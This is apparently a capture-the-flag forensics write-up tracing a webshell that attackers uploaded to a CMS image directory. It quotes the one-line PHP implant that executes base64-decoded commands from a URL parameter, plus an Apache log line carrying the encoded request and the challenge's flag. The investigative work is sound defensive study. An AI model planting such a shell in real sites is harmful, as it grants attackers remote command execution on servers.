**Difficulty:** Easy

*Investigate and analyse the traces of an attack from an implanted webshell.*

#blue #forensics #webshell

Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!

---

Looking in the file system, the directory containing web application files is in `/var/www/html/CMSsite-master`. I looked for directories that might contain user uploaded files, suspecting the attacker may have been able to upload a webshell through the same method usual user content is uploaded. I looked into the `img` directory which contains images uploaded by users and one file that stands out, `images.php`.

This uploaded (script?) appears to take in a base64 encoded query parameter, which an attacker could insert commands into. I decided to investigate http logs to see if I could find a request from the attacker.

`/var/log/html/CMSsite-master/img/images.php`: 

`<?php system(base64_decode($_GET['query'])); ?>`

In the apache2 logs, I was able to find this request using the web shell with what appeared to be a base64 encoded query parameter.

`/var/log/apache2/other_vhosts_acces.log`:

`ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:20 +0000] "GET /CMSsite-master/img/images.php?query=ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo= HTTP/1.1" 200 229 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"`

Decoding this in CyberChef gives the flag.
